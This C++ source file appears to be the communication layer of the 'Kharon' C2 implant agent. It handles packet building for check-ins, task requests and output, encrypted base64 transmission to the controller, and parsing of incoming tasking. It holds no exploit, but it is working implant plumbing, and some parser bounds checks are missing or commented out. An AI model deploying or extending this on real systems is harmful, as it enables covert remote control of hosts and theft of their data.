#include <Kharon.h>

using namespace Root;

auto DECLFN Package::Base64EncSize(
    _In_ SIZE_T inlen
) -> SIZE_T {
    if (inlen == 0) return 0;
    
    SIZE_T padding = (inlen % 3) ? (3 - (inlen % 3)) : 0;
    
    if (inlen > (SIZE_MAX - padding) / 4 * 3) {
        return 0;
    }
    
    return ((inlen + padding) / 3) * 4;
}

auto DECLFN Package::Base64Enc(
    _In_ const unsigned char* in, 
    _In_ SIZE_T len
) -> char* {
    INT Base64Invs[80] = { 
        62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
        59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
        6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
        21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
        29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
        43, 44, 45, 46, 47, 48, 49, 50, 51 
    };
    
    const char B64Char[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    if (in == NULL || len == 0) return NULL;
    
    if (len > SIZE_MAX - 3) return NULL;
    
    SIZE_T elen = Base64EncSize(len);
    if (elen == 0) return NULL;
    
    char* out = (char*)hAlloc(elen + 1);
    if (!out) return NULL;
    
    out[elen] = '\0'; 
    
    SIZE_T i, j;
    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        UINT32 v = in[i];
        v = (i + 1 < len) ? (v << 8) | in[i + 1] : v << 8;
        v = (i + 2 < len) ? (v << 8) | in[i + 2] : v << 8;
        
        out[j]     = B64Char[(v >> 18) & 0x3F];
        out[j + 1] = B64Char[(v >> 12) & 0x3F];
        
        if (i + 1 < len) {
            out[j + 2] = B64Char[(v >> 6) & 0x3F];
        } else {
            out[j + 2] = '=';
        }
        
        if (i + 2 < len) {
            out[j + 3] = B64Char[v & 0x3F];
        } else {
            out[j + 3] = '=';
        }
    }
    
    return out;
}

auto DECLFN Package::Base64DecSize(
    _In_ const char* in
) -> SIZE_T {
    SIZE_T len;
    SIZE_T ret;
    SIZE_T i;

    if (in == NULL)
    return 0;

    len = Str::LengthA(in);
    ret = len / 4 * 3;

    for (i = len; i-- > 0; )
    {
    if (in[i] == '=')
    {
        ret--;
    }
    else {
        break;
    }
    }

    return ret;
}

auto DECLFN Package::b64IsValidChar(char c) -> INT {
    if (c >= '0' && c <= '9') return 1;
    if (c >= 'A' && c <= 'Z') return 1;
    if (c >= 'a' && c <= 'z') return 1;
    if (c == '+' || c == '/') return 1;
    if (c == '=') return 1; 
    return 0;
}

auto DECLFN Package::Base64Dec(
    _In_ const char* in, 
    _Out_ unsigned char* out, 
    _In_ SIZE_T outlen
) -> INT {
    static const INT Base64Invs[80] = { 
        62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
        59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
        6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
        21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
        29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
        43, 44, 45, 46, 47, 48, 49, 50, 51 
    };
    
    if (in == NULL || out == NULL) 
        { return 0; }
    
    SIZE_T len = Str::LengthA(in);
    if (len == 0 || len % 4 != 0) 
        { return 0; }
    
    SIZE_T required_size = Base64DecSize(in);
    if (outlen < required_size) 
        { return 0; }
    
    for (SIZE_T i = 0; i < len; i++) {
        if (!b64IsValidChar(in[i])) 
            return 0;
    }
    
    for (SIZE_T i = 0, j = 0; i < len; i += 4, j += 3) {
        if ((in[i] - 43) >= sizeof(Base64Invs)/sizeof(Base64Invs[0]) || 
            (in[i+1] - 43) >= sizeof(Base64Invs)/sizeof(Base64Invs[0]) ||
            (in[i+2] != '=' && (in[i+2] - 43) >= sizeof(Base64Invs)/sizeof(Base64Invs[0])) ||
            (in[i+3] != '=' && (in[i+3] - 43) >= sizeof(Base64Invs)/sizeof(Base64Invs[0]))) {
            return 0;
        }
        
        UINT32 v = Base64Invs[in[i] - 43];
        v = (v << 6) | Base64Invs[in[i + 1] - 43];
        v = (in[i + 2] == '=') ? (v << 6) : (v << 6) | Base64Invs[in[i + 2] - 43];
        v = (in[i + 3] == '=') ? (v << 6) : (v << 6) | Base64Invs[in[i + 3] - 43];
        
        out[j] = (v >> 16) & 0xFF;
        if (in[i + 2] != '=') {
            out[j + 1] = (v >> 8) & 0xFF;
        }
        if (in[i + 3] != '=') {
            out[j + 2] = v & 0xFF;
        }
    }
    
    return 1;
}

unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsigned int output_size) {
    static const unsigned char decode_table[] = {
        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0, 62,  0,  0,  0, 63,
        52, 53, 54, 55, 56, 57, 58, 59, 60, 61,  0,  0,  0,  0,  0,  0,
        0,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,  0,  0,  0,  0,  0,
        0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,  0,  0,  0,  0,  0
    };

    unsigned int input_len = 0;
    while (input[input_len] != '\0') input_len++;

    if (input_len % 4 != 0) return 0;

    unsigned int output_len = input_len / 4 * 3;
    if (input[input_len - 1] == '=') output_len--;
    if (input[input_len - 2] == '=') output_len--;

    if (output_len > output_size) return 0;

    unsigned int i = 0, j = 0;
    while (i < input_len) {
        unsigned char a = input[i] == '=' ? 0 : decode_table[(unsigned char)input[i]];
        unsigned char b = input[i+1] == '=' ? 0 : decode_table[(unsigned char)input[i+1]];
        unsigned char c = input[i+2] == '=' ? 0 : decode_table[(unsigned char)input[i+2]];
        unsigned char d = input[i+3] == '=' ? 0 : decode_table[(unsigned char)input[i+3]];

        output[j++] = (a << 2) | ((b & 0x30) >> 4);
        if (input[i+2] != '=')
            output[j++] = ((b & 0x0F) << 4) | ((c & 0x3C) >> 2);
        if (input[i+3] != '=')
            output[j++] = ((c & 0x03) << 6) | d;

        i += 4;
    }

    return output_size;
}

auto DECLFN Int64ToBuffer( 
    _In_ PUCHAR Buffer, 
    _In_ UINT64 Value 
) -> VOID {
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

auto DECLFN Int32ToBuffer( 
    _In_ PUCHAR Buffer, 
    _In_ UINT32 Size 
) -> VOID {
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

auto DECLFN Int16ToBuffer(
    _In_ PUCHAR Buffer,
    _In_ UINT16 Value
) -> VOID {
    Buffer[1] = Value & 0xFF; 
    Value >>= 8;
    Buffer[0] = Value & 0xFF;
}

auto DECLFN Int8ToBuffer(
    _In_ PUCHAR Buffer,
    _In_ UINT8 Value
) -> VOID {
    Buffer[0] = Value & 0xFF;
}

auto DECLFN Package::Int16( 
    _In_ PPACKAGE Package, 
    _In_ INT16    dataInt 
) -> VOID {
    Package->Buffer = PTR( hReAlloc( Package->Buffer, Package->Length + sizeof( INT16 ) ) );

    Int16ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( UINT16 );
}

auto DECLFN Package::Int32( 
    _In_ PPACKAGE Package, 
    _In_ INT32    dataInt 
) -> VOID {
    Package->Buffer = PTR( hReAlloc( Package->Buffer, Package->Length + sizeof( INT32 ) ) );

    Int32ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( INT32 );
}

auto DECLFN Package::Int64( 
    _In_ PPACKAGE Package, 
    _In_ INT64    dataInt 
) -> VOID {
    Package->Buffer = PTR( hReAlloc(
        Package->Buffer,
        Package->Length + sizeof( INT64 )
    ));

    Int64ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =  Package->Length;
    Package->Length += sizeof( INT64 );
}

auto DECLFN Package::Create( 
    _In_ ULONG CommandID,
    _In_ PCHAR UUID
) -> PPACKAGE {
    PACKAGE* Package = NULL;

    Package         = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
    Package->Buffer = hAlloc( sizeof( BYTE ) );
    Package->Length = 0;

    this->Bytes( Package, UC_PTR( UUID ), 36 );
    this->Int16( Package, CommandID );

    Package->TaskUUID = UUID;

    return Package;
}

auto DECLFN Package::Checkin( VOID ) -> PACKAGE* {
    PACKAGE* Package = NULL;

    Package          = (PPACKAGE)hAlloc( sizeof( PACKAGE ) );
    Package->Buffer  = hAlloc( sizeof( BYTE ) );
    Package->Length  = 0;
    Package->Encrypt = FALSE;

    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
    this->Byte( Package, Enm::Task::Checkin );

    return Package;
}

auto DECLFN Package::PostJobs( VOID ) -> PACKAGE* {
    PACKAGE* Package = NULL;

    Package          = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
    Package->Buffer  = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length  = 0;
    Package->Encrypt = FALSE;

    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
    this->Byte( Package, Enm::Task::PostReq );

    return Package;
}

auto DECLFN Package::NewTask( 
    VOID
) -> PPACKAGE {
    PPACKAGE Package = NULL;

    Package          = (PPACKAGE)hAlloc( sizeof( PACKAGE ) );
    Package->Buffer  = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length  = 0;
    Package->Encrypt = FALSE;

    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
    this->Byte( Package, Enm::Task::GetTask );

    return Package;
}

auto DECLFN Package::Destroy( 
    _In_ PPACKAGE Package 
) -> VOID {
    if ( ! Package ) return;

    if ( Package->Buffer ) {
        hFree( Package->Buffer );
        Package->Buffer = nullptr;
        Package->Length = 0;
    }

    if ( Package ) {
        hFree( Package );
        Package = nullptr;
    }
    
    return;
}

auto DECLFN Package::Transmit( 
    PPACKAGE Package, 
    PVOID   *Response, 
    UINT64  *Size 
) -> BOOL {
    BOOL   Success       = FALSE;
    PVOID  Base64Buff    = nullptr;
    UINT64 Base64Size    = 0;
    PVOID  RetBuffer     = nullptr;
    UINT64 Retsize       = 0;

    ULONG EncryptOffset  = 36;
    ULONG PlainLen       = Package->Length - EncryptOffset;
    ULONG PaddedLen      = Self->Crp->CalcPadding( PlainLen );
    ULONG TotalPacketLen = EncryptOffset + PaddedLen;

    Package->Buffer = hReAlloc( Package->Buffer, TotalPacketLen );
    Package->Length = TotalPacketLen;

    PBYTE EncBuffer = (PBYTE)Self->Mm->Alloc(nullptr, TotalPacketLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if ( ! EncBuffer ) return FALSE;

    Mem::Copy( EncBuffer, Package->Buffer, EncryptOffset );

    Mem::Copy( EncBuffer + EncryptOffset, B_PTR( Package->Buffer ) + EncryptOffset, PlainLen );

    Self->Crp->AddPadding( EncBuffer + EncryptOffset, PlainLen, PaddedLen );
    Self->Crp->Encrypt( EncBuffer + EncryptOffset, PaddedLen );

    if ( ! Self->Session.Connected ) {
        if ( TotalPacketLen < sizeof( Self->Crp->LokKey ) ) {
            Self->Mm->Free( EncBuffer, 0, MEM_RELEASE );
            return FALSE;
        }

        Mem::Copy(
            EncBuffer + (TotalPacketLen - sizeof(Self->Crp->LokKey)),
            Self->Crp->LokKey, sizeof( Self->Crp->LokKey )
        );
    }

    PCHAR FinalPacket = this->Base64Enc((const UCHAR*)EncBuffer, TotalPacketLen);
    if (!FinalPacket) {
        Self->Mm->Free(EncBuffer, 0, MEM_RELEASE);
        return FALSE;
    }

    UINT64 FinalPacketLen = this->Base64EncSize(TotalPacketLen);

    if (Self->Tsp->Send(FinalPacket, FinalPacketLen, &Base64Buff, &Base64Size)) {
        Success = TRUE;
    }

    hFree(FinalPacket);
    Self->Mm->Free(EncBuffer, 0, MEM_RELEASE);

    if (Success && Base64Buff && Base64Size) {
        Retsize   = this->Base64DecSize((PCHAR)Base64Buff);
        RetBuffer = hAlloc(Retsize);
        if (RetBuffer) {
            base64_decode((PCHAR)Base64Buff, (PUCHAR)RetBuffer, Retsize);
            if (Response && Size) {
                UCHAR* DecBuff = (UCHAR*)((UPTR)(RetBuffer) + EncryptOffset);
                ULONG  DecLen  = Retsize - EncryptOffset;
                Self->Crp->Decrypt(DecBuff, DecLen);
                *Response = RetBuffer;
                *Size     = Retsize;
            } else {
                hFree(RetBuffer);
            }
        }
        if (Base64Buff) hFree(Base64Buff);
    }

    return Success;
}


auto DECLFN Package::Byte( 
    _In_ PPACKAGE Package, 
    _In_ BYTE     dataInt 
) -> VOID {
    Package->Buffer = hReAlloc( Package->Buffer, Package->Length + sizeof( BYTE ) );
    if ( !Package->Buffer ) { return; }

    ( B_PTR( Package->Buffer ) + Package->Length )[0] = dataInt;
    Package->Length += 1;

    return;
}

auto DECLFN Package::Pad( 
    _In_ PPACKAGE Package, 
    _In_ PUCHAR   Data, 
    _In_ SIZE_T   Size 
) -> VOID {
    Package->Buffer = A_PTR( hReAlloc(
        Package->Buffer,
        Package->Length + Size
    ));

    Mem::Copy( PTR( U_PTR( Package->Buffer ) + ( Package->Length ) ), PTR( Data ), Size );

    Package->Size    = Package->Length;
    Package->Length += Size;
}

auto DECLFN Package::Bytes( 
    _In_ PPACKAGE Package, 
    _In_ PUCHAR   Data, 
    _In_ SIZE_T   Size 
) -> VOID {
    this->Int32( Package, Size );

    Package->Buffer = PTR( hReAlloc( Package->Buffer, Package->Length + Size ) );

    Int32ToBuffer( UC_PTR( U_PTR( Package->Buffer ) + ( Package->Length - sizeof( UINT32 ) ) ), Size );

    Mem::Copy( PTR( U_PTR( Package->Buffer ) + Package->Length ), PTR( Data ), Size );

    Package->Size   =   Package->Length;
    Package->Length +=  Size;
}

auto DECLFN Package::Str( 
    _In_ PPACKAGE package, 
    _In_ PCHAR    data 
) -> VOID {
    return this->Bytes( package, (BYTE*) data, Str::LengthA( data ) );
}

auto DECLFN Package::Wstr( 
    _In_ PPACKAGE package, 
    _In_ PWCHAR   data 
) -> VOID {
    return this->Bytes( package, (BYTE*) data, Str::LengthW( data ) * 2 );
}

auto DECLFN Package::SendOut(
    _In_ ULONG Type,
    _In_ ULONG CmdID,
    _In_ BYTE* Buffer,
    _In_ INT32 Length
) -> BOOL {
    PACKAGE* Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );

    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length = 0;

    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
    this->Byte( Package, Enm::Task::QuickOut );

    this->Pad( Package, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
    this->Int32( Package, CmdID );
    this->Int32( Package, Type );
    this->Bytes( Package, Buffer, Length );

    BOOL result = this->Transmit( Package, nullptr, 0 );

    if ( Package ) this->Destroy( Package );

    return result;
}

auto DECLFN Package::FmtMsg(
    _In_ ULONG Type,
    _In_ CHAR* Message,
    ...    
) -> BOOL {
    va_list VaList = { 0 };
    va_start( VaList, Message );

    BOOL  result   = 0;
    ULONG MsgSize  = 0;
    CHAR* MsgBuff  = nullptr;
    
    PACKAGE* Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );

    MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, Message, VaList );
    if ( MsgSize < 0 ) {
        KhDbg( "failed get the formated message size" ); goto _KH_END;
    }

    MsgBuff = (CHAR*)hAlloc( MsgSize +1 );

    if ( Self->Msvcrt.vsnprintf( MsgBuff, MsgSize, Message, VaList ) < 0 ) {
        KhDbg( "failed formating string" ); goto _KH_END;
    }

    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length = 0;

    this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
    this->Byte( Package, Enm::Task::QuickMsg );

    if ( PROFILE_C2 == PROFILE_SMB ) {
        // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
    }

    this->Pad( Package, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
    this->Int32( Package, Type );
    this->Str( Package, Message );

    result = this->Transmit( Package, nullptr, 0 );

_KH_END:
    if ( Package ) this->Destroy( Package );
    if ( VaList  ) va_end( VaList );
    if ( MsgBuff ) hFree( MsgBuff );

    return result;   
}


auto DECLFN Package::SendMsg(
    _In_ ULONG Type,
    _In_ CHAR* Message
) -> BOOL {
    PACKAGE* Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );

    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length = 0;

    this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
    this->Byte( Package, Enm::Task::QuickMsg );

    if ( PROFILE_C2 == PROFILE_SMB ) {
        // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
    }

    this->Pad( Package, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
    this->Int32( Package, Type );
    this->Str( Package, Message );

    BOOL result = this->Transmit( Package, nullptr, 0 );

    if ( Package ) this->Destroy( Package );

    return result;
}

auto DECLFN Parser::New( 
    _In_ PPARSER parser, 
    _In_ PVOID   Buffer, 
    _In_ UINT64  size 
) -> VOID {
    if ( parser == NULL )
        return;

    parser->Original = A_PTR( hAlloc( size ) );
    Mem::Copy( PTR( parser->Original ), PTR( Buffer ), size );
    parser->Buffer   = parser->Original;
    parser->Length   = size;
    parser->Size     = size;
}

auto DECLFN Parser::NewTask( 
    _In_ PPARSER parser, 
    _In_ PVOID   Buffer, 
    _In_ UINT64  size 
) -> VOID {
    if ( parser == NULL )
        return;

    parser->Original = A_PTR( hAlloc( size ) );
    Mem::Copy( PTR( parser->Original ), PTR( Buffer ), size );
    parser->Buffer   = parser->Original;
    parser->Length   = size;
    parser->Size     = size;

    Self->Psr->Pad( parser, 36 );
}

auto DECLFN Parser::Pad(
    _In_  PPARSER parser,
    _Out_ ULONG size
) -> BYTE* {
    if (!parser)
        return NULL;

    if (parser->Length < size)
        return NULL;

    BYTE* padData = B_PTR(parser->Buffer);

    parser->Buffer += size;
    parser->Length -= size;

    return padData;
}

auto DECLFN Parser::Int32( 
    _In_ PPARSER parser 
) -> INT32 {
    INT32 intBytes = 0;

    // if ( parser->Length < 4 )
        // return 0;

    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 4 );

    parser->Buffer += 4;
    parser->Length -= 4;

    if ( !this->Endian )
        return ( INT ) intBytes;
    else
        return ( INT ) __builtin_bswap32( intBytes );
}

auto DECLFN Parser::Bytes( 
    _In_ PPARSER parser, 
    _In_ ULONG*  size 
) -> BYTE* {
    UINT32  Length  = 0;
    BYTE*   outdata = NULL;

    if ( parser->Length < 4 || !parser->Buffer ){
        return NULL;
    }

    Mem::Copy( PTR( &Length ), PTR( parser->Buffer ), 4 );
    parser->Buffer += 4;
    if ( this->Endian )
        Length = __builtin_bswap32( Length );

    outdata = B_PTR( parser->Buffer );
    if ( outdata == NULL )
        return NULL;
        
    parser->Length -= 4;
    parser->Length -= Length;
    parser->Buffer += Length;

    if ( size != NULL )
        *size = Length;

    return outdata;
}

auto DECLFN Parser::Destroy( 
    _In_ PPARSER Parser 
) -> BOOL {
    if ( ! Parser ) return FALSE;

    BOOL Success = TRUE;

    if ( Parser->Original ) {
        Success = hFree( Parser->Original );
        Parser->Original = nullptr;
        Parser->Length   = 0;
    }

    if ( Parser ) {
        Success = hFree( Parser );
        Parser = nullptr;
    }

    return Success;
}

auto DECLFN Parser::Str( 
    _In_ PPARSER parser, 
    _In_ ULONG* size 
) -> PCHAR {
    return ( PCHAR ) Self->Psr->Bytes( parser, size );
}

auto DECLFN Parser::Wstr( 
    _In_ PPARSER parser, 
    _In_ ULONG*  size 
) -> PWCHAR {
     return ( PWCHAR )Self->Psr->Bytes( parser, size );
}

auto DECLFN Parser::Int16( 
    _In_ PPARSER parser
) -> INT16 {
    INT16 intBytes = 0;

    if ( parser->Length < 2 )
        return 0;

    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 2 );

    parser->Buffer += 2;
    parser->Length -= 2;

    if ( !this->Endian ) 
        return intBytes;
    else 
        return __builtin_bswap16( intBytes ) ;
}

auto DECLFN Parser::Int64( 
    _In_ PPARSER parser 
) -> INT64 {
    INT64 intBytes = 0;

    if ( ! parser )
        return 0;

    if ( parser->Length < 8 )
        return 0;

    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 8 );

    parser->Buffer += 8;
    parser->Length -= 8;

    if ( !this->Endian )
        return ( INT64 ) intBytes;
    else
        return ( INT64 ) __builtin_bswap64( intBytes );
}

auto DECLFN Parser::Byte( 
    _In_ PPARSER parser 
) -> BYTE {
    BYTE intBytes = 0;

    if ( parser->Length < 1 )
        return 0;

    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 1 );

    parser->Buffer += 1;
    parser->Length -= 1;

    return intBytes;
}